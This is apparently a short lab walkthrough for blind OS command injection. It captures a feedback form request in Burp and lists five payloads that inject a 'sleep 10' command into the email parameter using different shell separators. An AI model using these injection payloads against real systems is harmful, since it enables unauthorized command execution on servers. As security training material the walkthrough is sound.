On the home page click on the `Submit feedback` button. Turn **on** Burp Proxy Intercept. Next, on the feedback page fill the fields as you wish and then click `Submit feedback`. 
On the Burp Proxy Intercept tab send the request to repeater. Then edit the **email** parameter in the body and use one of the following payloads:-

```
&name=Dude&email=dude;sleep+10;&subject=Just+a+cool+dude
&name=Dude&email=dude|sleep+10|&subject=Just+a+cool+dude
&name=Dude&email=dude%26sleep+10%26&subject=Just+a+cool+dude
&name=Dude&email=dude%0asleep+10%0a&subject=Just+a+cool+dude
&name=Dude&email=dude||sleep+10||&subject=Just+a+cool+dude
```
